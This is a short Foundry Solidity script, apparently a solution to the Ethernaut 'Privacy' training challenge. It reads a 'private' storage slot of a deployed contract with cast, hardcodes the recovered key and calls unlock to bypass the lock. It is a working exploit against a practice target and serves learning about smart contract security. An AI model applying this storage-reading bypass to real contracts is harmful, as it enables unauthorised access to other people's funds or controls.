// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/12_Privacy.sol";

contract POC is Script {
    Privacy public target;

    function setUp() external {
        target = Privacy(0xDaf4F414e8A699979847f2f915bAb9BDb2562947);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // cast storage 0xDaf4F414e8A699979847f2f915bAb9BDb2562947 5 --rpc-url $RPC_URL
        bytes32 key = 0x93615177f13477ffb05e3f834e066be1adab311848b161000a0e751b9cc4e82a;

        bool locked = target.locked();
        console.log("before status: ", locked);

        target.unlock(bytes16(key));

        locked = target.locked();
        console.log("after  status: ", locked);
        vm.stopBroadcast();
    }
}